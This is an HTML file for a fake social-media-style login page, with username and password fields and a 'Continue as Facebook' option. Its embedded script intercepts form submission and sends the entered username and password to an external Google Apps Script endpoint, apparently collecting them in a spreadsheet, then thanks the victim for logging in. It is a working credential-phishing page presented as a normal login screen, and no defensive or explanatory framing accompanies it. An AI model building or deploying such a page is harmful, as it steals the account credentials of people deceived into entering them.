<!DOCTYPE html>
<html lang="en">
    <head>
        <title>login page</title>
        <link rel="stylesheet" href="stylesheet.css">
    </head>
    <body>
        <form  autocomplete="off" method="post" name="google-sheet">
            <div class="box2">
                <div class="logo">   
                </div>
                <div class="inputbox1">
                     <input type="text" placeholder="Phone number,email or username" required name="username">
                </div>
                <div class="inputbox2">
                     <input type="password" placeholder="Password" required name="password">
                </div>
                <div class="inputbox3">
                     <button value="login" type="submit" name="login">Login</button>
                </div>
                <div class="inputbox4">
                     <span>Forget your login details?<a href="#">Get help logging in.</a></span>
                 </div>
                 <div class="inputbox5">
                      <div class="line1">_______________</div>
                      <div class="text">OR</div>
                      <div class="line2">_______________</div>
                 </div>
                 <div class="inputbox6">
                      <span></ion-icon><ion-icon name="logo-facebook"></ion-icon>Continue as Facebook</span>
                 </div>
            </div>
        </form>
    </body>
     <!-- JAVA script -->

     <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbxSakQ1tmeLUmQYuw_AG2URff_74n2xVfX16Or8JdK3cAxXijI-MuHcuw6AkvxcW9tbxg/exec'
             const form = document.forms['google-sheet']
          
             form.addEventListener('submit', e => {
               e.preventDefault()
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                 .then(response => alert("thank you for login..."))
                 .catch(error => console.error('Error!', error.message))
             })
     </script>
     <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
     <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
</html>
